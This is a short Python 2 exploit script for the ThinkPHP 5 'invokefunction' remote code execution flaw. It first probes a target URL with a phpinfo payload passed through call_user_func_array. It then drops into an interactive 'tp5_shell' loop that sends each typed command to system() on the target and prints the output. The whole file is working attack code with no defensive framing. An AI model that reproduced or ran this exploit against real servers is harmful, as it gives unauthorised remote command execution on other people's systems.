# /usr/bin/env python
# -*- coding:utf-8 -*-

import sys
import requests

reload(sys)
sys.setdefaultencoding('utf-8')

def test(url):
    payload = r"/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1"
    url += payload
    #print url
    r = requests.get(url)
    try:
        if 'PHP Version' in r.text:
            return True
        else:
            return False
    except:
        print '[!] Destination address cannot be connected'
        return False

def exp(u):
    while(1):
        url = u
        command = raw_input("fuhei@tp5_shell$ ")
        if command != "exit":
            payload = r"/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]="+str(command)
            url += payload
            r = requests.get(url)
            print r.text
        else:
            break




if __name__ == '__main__':
    url = sys.argv[1]
    if test(url):
        print "[+] Remote code execution vulnerability exists at the target address"
        exp(url)
    else:
        print "[-] There is no remote code execution vulnerability in the target address"
